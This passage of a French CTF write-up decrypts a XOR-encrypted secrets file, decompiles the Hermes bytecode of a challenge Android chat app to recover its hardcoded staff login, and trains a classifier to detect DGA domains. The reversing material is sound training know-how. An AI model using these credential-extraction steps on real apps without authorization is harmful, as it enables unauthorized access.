+</span></span><span class="line"><span class="cl">        <span class="k">for</span> <span class="n">i</span><span class="p">,</span> <span class="n">char</span> <span class="ow">in</span> <span class="nb">enumerate</span><span class="p">(</span><span class="n">texte_chiffre</span><span class="p">):</span>
+</span></span><span class="line"><span class="cl">                <span class="n">val_char</span> <span class="o">=</span> <span class="nb">ord</span><span class="p">(</span><span class="n">char</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">                <span class="n">val_dechiffre</span> <span class="o">=</span> <span class="p">(</span><span class="n">val_char</span> <span class="o">-</span> <span class="mi">1</span><span class="p">)</span> <span class="o">^</span> <span class="n">cle_int</span><span class="p">[</span><span class="n">i</span> <span class="o">%</span> <span class="nb">len</span><span class="p">(</span><span class="n">cle</span><span class="p">)]</span>
+</span></span><span class="line"><span class="cl">                <span class="n">dechiffre_texte</span> <span class="o">+=</span> <span class="nb">chr</span><span class="p">(</span><span class="n">val_dechiffre</span> <span class="o">&amp;</span> <span class="mh">0xFF</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="n">dechiffre_texte</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">msg</span> <span class="o">=</span> <span class="s1">&#39;$</span><span class="se">\&#39;</span><span class="s1">&#34;</span><span class="se">\x13</span><span class="s1">3`*6/[?_</span><span class="se">\&#39;</span><span class="s1">$8IA</span><span class="se">\x14</span><span class="s1">&#39;</span>
+</span></span><span class="line"><span class="cl"><span class="n">won</span> <span class="o">=</span> <span class="n">dechiffre_vigenere</span><span class="p">(</span><span class="n">msg</span><span class="p">,</span><span class="s2">&#34;GCC{&#34;</span><span class="p">)[:</span><span class="mi">4</span><span class="p">]</span>
+</span></span><span class="line"><span class="cl"><span class="k">assert</span><span class="p">(</span><span class="n">won</span> <span class="o">==</span> <span class="s2">&#34;debi&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">key</span> <span class="o">=</span> <span class="n">won</span> <span class="o">+</span> <span class="s2">&#34;a&#34;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">flag</span> <span class="o">=</span> <span class="s2">&#34;&#34;</span>
+</span></span><span class="line"><span class="cl"><span class="k">for</span> <span class="n">c</span> <span class="ow">in</span> <span class="n">string</span><span class="o">.</span><span class="n">printable</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">        <span class="n">r</span> <span class="o">=</span> <span class="n">dechiffre_vigenere</span><span class="p">(</span><span class="n">msg</span><span class="p">,</span><span class="n">key</span><span class="o">+</span><span class="n">c</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="n">r</span><span class="o">.</span><span class="n">startswith</span><span class="p">(</span><span class="s2">&#34;GCC{&#34;</span><span class="p">)</span> <span class="ow">and</span> <span class="n">r</span><span class="o">.</span><span class="n">endswith</span><span class="p">(</span><span class="s2">&#34;}&#34;</span><span class="p">):</span>
+</span></span><span class="line"><span class="cl">                <span class="n">flag</span><span class="o">+=</span><span class="n">r</span>
+</span></span><span class="line"><span class="cl"><span class="nb">print</span><span class="p">(</span><span class="n">flag</span><span class="p">)</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>ou, en devinant la clé, d&rsquo;après l&rsquo;énoncé et notre analyse sur le hostname:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-py" data-lang="py"><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="n">xor</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">key</span> <span class="o">=</span> <span class="sa">b</span><span class="s2">&#34;debian&#34;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">min_1_secrets</span> <span class="o">=</span> <span class="p">[]</span> 
+</span></span><span class="line"><span class="cl"><span class="k">with</span> <span class="nb">open</span><span class="p">(</span><span class="s2">&#34;secrets.txt.enc&#34;</span><span class="p">,</span> <span class="s2">&#34;rb&#34;</span><span class="p">)</span> <span class="k">as</span> <span class="n">secrets_file</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">    <span class="n">secrets</span> <span class="o">=</span> <span class="n">secrets_file</span><span class="o">.</span><span class="n">read</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl">    <span class="k">for</span> <span class="n">c</span> <span class="ow">in</span> <span class="n">secrets</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">        <span class="n">min_1_secrets</span><span class="o">.</span><span class="n">append</span><span class="p">(</span><span class="n">c</span> <span class="o">-</span> <span class="mi">1</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="nb">print</span><span class="p">(</span><span class="n">xor</span><span class="p">(</span><span class="n">min_1_secrets</span><span class="p">,</span> <span class="n">key</span><span class="p">))</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><h3 id="gcc-chat-1">GCC Chat 1</h3>
+<h4 id="analyse-statique">Analyse statique</h4>
+<p>On dispose d&rsquo;un fichier <code>GCC_Chat.apk</code>. Étudions son conde source avec <strong>JADX</strong>.</p>
+<p>Dans, <code>AndroidManifest.xml</code> on constate que <code>MainActivity</code> est directement lancée avec l&rsquo;intent <code>LAUNCHER</code>.</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-xml" data-lang="xml"><span class="line"><span class="cl"><span class="nt">&lt;activity</span> <span class="na">android:theme=</span><span class="s">&#34;@style/Theme.App.SplashScreen&#34;</span> <span class="na">android:name=</span><span class="s">&#34;com.aloxos.gccchat.MainActivity&#34;</span> <span class="na">android:exported=</span><span class="s">&#34;true&#34;</span> <span class="na">android:launchMode=</span><span class="s">&#34;singleTask&#34;</span> <span class="na">android:screenOrientation=</span><span class="s">&#34;portrait&#34;</span> <span class="na">android:configChanges=</span><span class="s">&#34;screenSize|uiMode|screenLayout|orientation|keyboardHidden|keyboard&#34;</span> <span class="na">android:windowSoftInputMode=</span><span class="s">&#34;adjustResize&#34;</span><span class="nt">&gt;</span>
+</span></span><span class="line"><span class="cl">    <span class="nt">&lt;intent-filter&gt;</span>
+</span></span><span class="line"><span class="cl">        <span class="nt">&lt;action</span> <span class="na">android:name=</span><span class="s">&#34;android.intent.action.MAIN&#34;</span><span class="nt">/&gt;</span>
+</span></span><span class="line"><span class="cl">        <span class="nt">&lt;category</span> <span class="na">android:name=</span><span class="s">&#34;android.intent.category.LAUNCHER&#34;</span><span class="nt">/&gt;</span>
+</span></span><span class="line"><span class="cl">    <span class="nt">&lt;/intent-filter&gt;</span>
+</span></span><span class="line"><span class="cl">    <span class="nt">&lt;intent-filter&gt;</span>
+</span></span><span class="line"><span class="cl">        <span class="nt">&lt;action</span> <span class="na">android:name=</span><span class="s">&#34;android.intent.action.VIEW&#34;</span><span class="nt">/&gt;</span>
+</span></span><span class="line"><span class="cl">        <span class="nt">&lt;category</span> <span class="na">android:name=</span><span class="s">&#34;android.intent.category.DEFAULT&#34;</span><span class="nt">/&gt;</span>
+</span></span><span class="line"><span class="cl">        <span class="nt">&lt;category</span> <span class="na">android:name=</span><span class="s">&#34;android.intent.category.BROWSABLE&#34;</span><span class="nt">/&gt;</span>
+</span></span><span class="line"><span class="cl">        <span class="nt">&lt;data</span> <span class="na">android:scheme=</span><span class="s">&#34;com.aloxos.gccchat&#34;</span><span class="nt">/&gt;</span>
+</span></span><span class="line"><span class="cl">    <span class="nt">&lt;/intent-filter&gt;</span>
+</span></span><span class="line"><span class="cl"><span class="nt">&lt;/activity&gt;</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>On repère également d&rsquo;autres classes associées à <code>React</code> et <code>Expo</code>.
+On clique alors sur le <code>MainActivity</code> qui hérite de la classe abstraite <code>ReactActivity</code>:</p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="./jadx.png"
+        data-srcset="./jadx.png, ./jadx.png 1.5x, ./jadx.png 2x"
+        data-sizes="auto"
+        alt="./jadx.png"
+        title="jadx" /></p>
+<p>En effectuant <code>Find Usage(x)</code> sur <code>onCreate</code>, on remarque en effet une définition de <code>Bundle()</code> dans <code>ComponentActivity</code>:
+D&rsquo;autre part on pourrait remarquer l&rsquo;import de <code>android.os.Bundle</code> , également présent dans le bytecode Kotlin.
+Beaucoup de bibliothèques dynamiques sont présentes , à ce stade on peut lancer l&rsquo;application dans <strong>Android Studio</strong></p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="./avd.png"
+        data-srcset="./avd.png, ./avd.png 1.5x, ./avd.png 2x"
+        data-sizes="auto"
+        alt="./avd.png"
+        title="avd" /></p>
+<p>On peut aussi chercher quelques strings relatives à l&rsquo;erreur de connection dans:</p>
+<ul>
+<li>ressources/ressources.arsc/res/values/strings.xml</li>
+<li>ressources/res/layout</li>
+</ul>
+<p>Ce qui n&rsquo;est pas concluant. On peut aussi perdre beaucoup de temps à inspecter le code les bibliothèques dynamiques dans <strong>Ghidra</strong>, mais cela ne mène à rien.</p>
+<h4 id="reverse-du-bytecode-hermes">Reverse du bytecode Hermes</h4>
+<p>Si on n&rsquo;avait pas prêté attention au <code>Bundle</code>, on peut alors effectuer un grep dans les ressources statiques:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">grep -r <span class="s2">&#34;Wrong username&#34;</span>
+</span></span><span class="line"><span class="cl">grep: resources/assets/index.android.bundle : fichiers binaires correspondent
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>Intéressant:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">file resources/assets/index.android.bundle
+</span></span><span class="line"><span class="cl">resources/assets/index.android.bundle: Hermes JavaScript bytecode, version <span class="m">96</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>Avec google, on tombe rapidement sur l&rsquo;outil <a href="https://github.com/bongtrop/hbctool" target="_blank" rel="noopener noreffer ">hbctool</a>, qui doit être patché pour supporter la version du bytecode:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-gdscript3" data-lang="gdscript3"><span class="line"><span class="cl"><span class="n">hbctool</span> <span class="n">disasm</span> <span class="n">index</span><span class="o">.</span><span class="n">android</span><span class="o">.</span><span class="n">bundle</span> <span class="o">.</span>
+</span></span><span class="line"><span class="cl"><span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">Disassemble</span> <span class="s1">&#39;index.android.bundle&#39;</span> <span class="n">to</span> <span class="s1">&#39;.&#39;</span> <span class="n">path</span>
+</span></span><span class="line"><span class="cl"><span class="n">Traceback</span> <span class="p">(</span><span class="n">most</span> <span class="n">recent</span> <span class="n">call</span> <span class="n">last</span><span class="p">):</span>
+</span></span><span class="line"><span class="cl">  <span class="ne">File</span> <span class="s2">&#34;/home/.local/bin/hbctool&#34;</span><span class="p">,</span> <span class="n">line</span> <span class="mi">8</span><span class="p">,</span> <span class="ow">in</span> <span class="o">&lt;</span><span class="n">module</span><span class="o">&gt;</span>
+</span></span><span class="line"><span class="cl">    <span class="n">sys</span><span class="o">.</span><span class="n">exit</span><span class="p">(</span><span class="n">main</span><span class="p">())</span>
+</span></span><span class="line"><span class="cl">             <span class="o">^^^^^^</span>
+</span></span><span class="line"><span class="cl">  <span class="ne">File</span> <span class="s2">&#34;/home/.local/lib/python3.11/site-packages/hbctool/__init__.py&#34;</span><span class="p">,</span> <span class="n">line</span> <span class="mi">61</span><span class="p">,</span> <span class="ow">in</span> <span class="n">main</span>
+</span></span><span class="line"><span class="cl">    <span class="n">disasm</span><span class="p">(</span><span class="n">args</span><span class="p">[</span><span class="s1">&#39;&lt;HBC_FILE&gt;&#39;</span><span class="p">],</span> <span class="n">args</span><span class="p">[</span><span class="s1">&#39;&lt;HASM_PATH&gt;&#39;</span><span class="p">])</span>
+</span></span><span class="line"><span class="cl">  <span class="ne">File</span> <span class="s2">&#34;/home/night/.local/lib/python3.11/site-packages/hbctool/__init__.py&#34;</span><span class="p">,</span> <span class="n">line</span> <span class="mi">33</span><span class="p">,</span> <span class="ow">in</span> <span class="n">disasm</span>
+</span></span><span class="line"><span class="cl">    <span class="n">hbco</span> <span class="o">=</span> <span class="n">hbc</span><span class="o">.</span><span class="n">load</span><span class="p">(</span><span class="n">f</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">           <span class="o">^^^^^^^^^^^</span>
+</span></span><span class="line"><span class="cl">  <span class="ne">File</span> <span class="s2">&#34;/home/.local/lib/python3.11/site-packages/hbctool/hbc/__init__.py&#34;</span><span class="p">,</span> <span class="n">line</span> <span class="mi">29</span><span class="p">,</span> <span class="ow">in</span> <span class="nb">load</span>
+</span></span><span class="line"><span class="cl">    <span class="nb">assert</span> <span class="n">version</span> <span class="ow">in</span> <span class="n">HBC</span><span class="p">,</span> <span class="n">f</span><span class="s2">&#34;The HBC version ({version}) is not supported.&#34;</span>
+</span></span><span class="line"><span class="cl">           <span class="o">^^^^^^^^^^^^^^</span>
+</span></span><span class="line"><span class="cl"><span class="n">AssertionError</span><span class="p">:</span> <span class="n">The</span> <span class="n">HBC</span> <span class="n">version</span> <span class="p">(</span><span class="mi">96</span><span class="p">)</span> <span class="n">is</span> <span class="ow">not</span> <span class="n">supported</span><span class="o">.</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>Après coup, on aurait pu utiliser <a href="https://github.com/P1sec/hermes-dec" target="_blank" rel="noopener noreffer ">hermes-dec</a>:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">hbc-decompiler index.android.bundle <span class="p">|</span> less
+</span></span><span class="line"><span class="cl"><span class="c1">#/Wrong username</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>Qui permet de produire un assembleur de la fonction de Login:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span><span class="lnt">25
+</span><span class="lnt">26
+</span><span class="lnt">27
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-asm" data-lang="asm"><span class="line"><span class="cl">            <span class="nf">r13</span> <span class="err">=</span> <span class="no">function</span><span class="p">()</span> <span class="err">{</span> <span class="c1">// Original name: handleLogin, environment: r13
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>                <span class="nl">_fun6460:</span> <span class="nf">for</span><span class="p">(</span><span class="no">var</span> <span class="no">_fun6460_ip</span> <span class="err">=</span> <span class="mi">0</span><span class="c1">; ; ) switch(_fun6460_ip) {
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="nf">case</span> <span class="mi">0</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">                    <span class="nf">r2</span> <span class="err">=</span> <span class="no">_closure2_slot1</span><span class="c1">;
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>                    <span class="nf">r1</span> <span class="err">=</span> <span class="err">&#39;</span><span class="no">GCC_Staff</span><span class="err">&#39;</span><span class="c1">;
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>                    <span class="nf">if</span><span class="p">(!(</span><span class="no">r2</span> <span class="err">===</span> <span class="no">r1</span><span class="p">))</span> <span class="err">{</span> <span class="no">_fun6460_ip</span> <span class="err">=</span> <span class="mi">27</span><span class="c1">; continue _fun6460 }
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="nf">case</span> <span class="mi">15</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">                    <span class="nf">r2</span> <span class="err">=</span> <span class="no">_closure2_slot4</span><span class="c1">;
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>                    <span class="nf">r1</span> <span class="err">=</span> <span class="err">&#39;</span><span class="mi">011</span><span class="no">efea0cac926232add733f86e3d9f6ab53c237be9e40f9e6a2e255ba33abc3</span><span class="err">&#39;</span><span class="c1">;
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>                    <span class="nf">if</span><span class="p">(!(</span><span class="no">r2</span> <span class="p">!</span><span class="err">==</span> <span class="no">r1</span><span class="p">))</span> <span class="err">{</span> <span class="no">_fun6460_ip</span> <span class="err">=</span> <span class="mi">48</span><span class="c1">; continue _fun6460 }
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="nf">case</span> <span class="mi">27</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">                    <span class="nf">r1</span> <span class="err">=</span> <span class="no">global</span><span class="c1">;
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>                    <span class="nf">r3</span> <span class="err">=</span> <span class="no">r1.alert</span><span class="c1">;
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>                    <span class="nf">r2</span> <span class="err">=</span> <span class="no">undefined</span><span class="c1">;
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>                    <span class="nf">r1</span> <span class="err">=</span> <span class="err">&#39;</span><span class="no">Wrong</span> <span class="no">username</span> <span class="no">or</span> <span class="no">password</span><span class="err">&#39;</span><span class="c1">;
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>                    <span class="nf">r1</span> <span class="err">=</span> <span class="no">r3.bind</span><span class="p">(</span><span class="no">r2</span><span class="p">)(</span><span class="no">r1</span><span class="p">)</span><span class="c1">;
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>                    <span class="nf">_fun6460_ip</span> <span class="err">=</span> <span class="mi">67</span><span class="c1">; continue _fun6460;
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="nf">case</span> <span class="mi">48</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">                    <span class="nf">r2</span> <span class="err">=</span> <span class="no">_closure2_slot0</span><span class="c1">;
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>                    <span class="nf">r1</span> <span class="err">=</span> <span class="no">r2.navigate</span><span class="c1">;
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>                    <span class="nf">r0</span> <span class="err">=</span> <span class="err">&#39;</span><span class="no">Main</span><span class="err">&#39;</span><span class="c1">;
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>                    <span class="nf">r0</span> <span class="err">=</span> <span class="no">r1.bind</span><span class="p">(</span><span class="no">r2</span><span class="p">)(</span><span class="no">r0</span><span class="p">)</span><span class="c1">;
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="nf">case</span> <span class="mi">67</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">                    <span class="nf">r0</span> <span class="err">=</span> <span class="no">undefined</span><span class="c1">;
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>                    <span class="nf">return</span> <span class="no">r0</span><span class="c1">;
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>                <span class="err">}</span>
+</span></span><span class="line"><span class="cl">            <span class="err">}</span><span class="c1">;
+</span></span></span></code></pre></td></tr></table>
+</div>
+</div><p>Les identifiants sont donc <code>GCC_Staff</code> et <code>P4ssw0rd</code>, ce qui permet de valider la première partie.</p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="./flag1.png"
+        data-srcset="./flag1.png, ./flag1.png 1.5x, ./flag1.png 2x"
+        data-sizes="auto"
+        alt="./flag1.png"
+        title="flag1" /></p>
+<h2 id="misc">Misc</h2>
+<h3 id="dga">DGA</h3>
+<p>Le nom du challenge faisait référence aux algorithmes de <strong>génération de noms de domaines</strong>, ayant souvent pour but de cacher la communication entre une machine infectée par un logiciel Command &amp; Control et le serveur de l&rsquo;attaquant.</p>
+<p>Ici nous disposons d&rsquo;une liste d&rsquo;url valides et d&rsquo;une liste malveillante afin de pouvoir entraîner un modèle devant classifier  en temps réel avec un taux de réussite de plus de 85%, via un service TCP.</p>
+<p>Un collègue ayant résolu ce challenge, je vous propose un writeup qualitatif d&rsquo;un joueur du CTF pour plus de détails <a href="https://nathan-out.github.io" target="_blank" rel="noopener noreffer ">https://nathan-out.github.io</a>).</p>
+<p>Voici donc une forme de notre modèle:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">numpy</span> <span class="k">as</span> <span class="nn">np</span>
+</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">pandas</span> <span class="k">as</span> <span class="nn">pd</span>
+</span></span><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">pandas</span> <span class="kn">import</span> <span class="n">DataFrame</span>
+</span></span><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">sklearn.model_selection</span> <span class="kn">import</span> <span class="n">train_test_split</span>
+</span></span><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">sklearn.tree</span> <span class="kn">import</span> <span class="n">DecisionTreeClassifier</span>
+</span></span><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">sklearn.metrics</span> <span class="kn">import</span> <span class="n">accuracy_score</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">legit_dataframe</span> <span class="o">=</span> <span class="n">pd</span><span class="o">.</span><span class="n">read_csv</span><span class="p">(</span><span class="s2">&#34;dataset_legit.txt&#34;</span><span class="p">,</span> <span class="n">header</span><span class="o">=</span><span class="mi">0</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">legit_dataframe</span><span class="p">[</span><span class="s1">&#39;class&#39;</span><span class="p">]</span> <span class="o">=</span> <span class="s1">&#39;legit&#39;</span>
+</span></span><span class="line"><span class="cl"><span class="n">X</span> <span class="o">=</span> <span class="n">all_domains</span><span class="p">[[</span><span class="s1">&#39;length&#39;</span><span class="p">,</span> <span class="s1">&#39;entropy&#39;</span><span class="p">,</span> <span class="s1">&#39;legit_websites_tfidf&#39;</span><span class="p">,</span> <span class="s1">&#39;eng_word_tfidf&#39;</span><span class="p">]]</span>
+</span></span><span class="line"><span class="cl"><span class="n">y</span> <span class="o">=</span> <span class="n">np</span><span class="o">.</span><span class="n">array</span><span class="p">(</span><span class="n">all_domains</span><span class="p">[</span><span class="s1">&#39;class&#39;</span><span class="p">]</span><span class="o">.</span><span class="n">tolist</span><span class="p">())</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">X_train</span><span class="p">,</span> <span class="n">X_test</span><span class="p">,</span> <span class="n">y_train</span><span class="p">,</span> <span class="n">y_test</span> <span class="o">=</span> <span class="n">train_test_split</span><span class="p">(</span><span class="n">X</span><span class="p">,</span> <span class="n">y</span><span class="p">,</span> <span class="n">test_size</span><span class="o">=</span><span class="mf">0.2</span><span class="p">)</span> <span class="c1">#20% pour test, 80% pour entraînement</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">model</span> <span class="o">=</span> <span class="n">DecisionTreeClassifier</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl"><span class="n">model</span><span class="o">.</span><span class="n">fit</span><span class="p">(</span><span class="n">X_train</span><span class="p">,</span> <span class="n">y_train</span><span class="p">)</span> <span class="c1"># entraînement avec les données d&#39;entraînement</span>
+</span></span><span class="line"><span class="cl"><span class="n">predictions</span> <span class="o">=</span> <span class="n">model</span><span class="o">.</span><span class="n">predict</span><span class="p">(</span><span class="n">X_test</span><span class="p">)</span> <span class="c1"># prédiction sur les données de test</span>
+</span></span><span class="line"><span class="cl"><span class="n">accuracy</span> <span class="o">=</span> <span class="n">accuracy_score</span><span class="p">(</span><span class="n">y_test</span><span class="p">,</span> <span class="n">predictions</span><span class="p">)</span> <span class="c1"># calcul de la précision par rapport au prédictions</span>
+</span></span><span class="line"><span class="cl"><span class="nb">print</span><span class="p">(</span><span class="s2">&#34;Exactitude (Accuracy) :&#34;</span><span class="p">,</span> <span class="n">accuracy</span><span class="p">)</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>Pour optimiser la détection, on peut supprimer de notre liste les prédictions extrêmes:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">outlier_thresholds</span><span class="p">(</span><span class="n">dataframe</span><span class="p">,</span> <span class="n">col_name</span><span class="p">,</span> <span class="n">q1</span><span class="o">=</span><span class="mf">0.20</span><span class="p">,</span> <span class="n">q3</span><span class="o">=</span><span class="mf">0.80</span><span class="p">):</span>
+</span></span><span class="line"><span class="cl">    <span class="n">quartile1</span> <span class="o">=</span> <span class="n">dataframe</span><span class="p">[</span><span class="n">col_name</span><span class="p">]</span><span class="o">.</span><span class="n">quantile</span><span class="p">(</span><span class="n">q1</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="n">quartile3</span> <span class="o">=</span> <span class="n">dataframe</span><span class="p">[</span><span class="n">col_name</span><span class="p">]</span><span class="o">.</span><span class="n">quantile</span><span class="p">(</span><span class="n">q3</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="n">interquantile_range</span> <span class="o">=</span> <span class="n">quartile3</span> <span class="o">-</span> <span class="n">quartile1</span>
+</span></span><span class="line"><span class="cl">    <span class="n">up_limit</span> <span class="o">=</span> <span class="n">quartile3</span> <span class="o">+</span> <span class="mf">1.5</span> <span class="o">*</span> <span class="n">interquantile_range</span>
+</span></span><span class="line"><span class="cl">    <span class="n">low_limit</span> <span class="o">=</span> <span class="n">quartile1</span> <span class="o">-</span> <span class="mf">1.5</span> <span class="o">*</span> <span class="n">interquantile_range</span>
+</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="n">low_limit</span><span class="p">,</span> <span class="n">up_limit</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">
